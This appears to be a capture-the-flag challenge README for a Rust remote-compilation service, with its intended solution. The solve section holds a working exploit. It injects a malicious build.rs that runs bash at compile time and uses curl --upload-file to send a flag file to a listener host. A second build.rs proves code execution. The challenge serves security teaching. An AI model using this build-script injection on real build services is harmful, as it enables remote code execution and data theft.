# Build And Drustroy

## Desc

- I love rust because it's secure and fast. So I want people to do MOAR rust.
- That's why I made a microservice to allow fast and easy remote code compilation.
- Send my your code, I'll compile it, and I know for sure I'm safe!

```bash
curl -sS -X POST -H 'Content-Type: application/json' http://127.0.0.1:3000/remote-build -d '{"src/main.rs":"fn main() { println!(\"Hello, world!\"); }"}' --output binary
file binary # binary: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, ...
```

## Goal

- Abuse build.rs to inject a compile-time command executions
- Spawn a shell
- Read flag

## Doc

- <https://www.rust-lang.org/learn>
- <https://doc.rust-lang.org/cargo/reference/build-scripts.html>

## Setup & Solve

```bash
# Setup
docker compose up
# Solve Listener
ip -br a ; nc -lnvp 8000
# Solve Exploit
curl -sS -X POST -H 'Content-Type: application/json' http://127.0.0.1:3000/remote-build -d '{"src/main.rs":"fn main() { println!(\"Hello, world!\"); }", "build.rs": "fn main() {use std::process::Command;let output = Command::new(\"/bin/bash\").arg(\"-c\").arg(\"curl --upload-file /flag/randomflaglolilolbigbisous.txt 172.17.0.1:8000\").output().expect(\"failed to execute process\");}"}' --output binary
```

## Clean build.rs file for RCE

```rs
fn main() {
    println!("Henlo build 🧙");
    use std::process::Command;
    let output = Command::new("/bin/bash")
                         .arg("-c")
                         .arg("date > /tmp/rce")
                         .output()
                         .expect("failed to execute process");

    println!("status: {}", output.status);
    println!("stdout: {}", String::from_utf8_lossy(&output.stdout));
    println!("stderr: {}", String::from_utf8_lossy(&output.stderr));
}
```
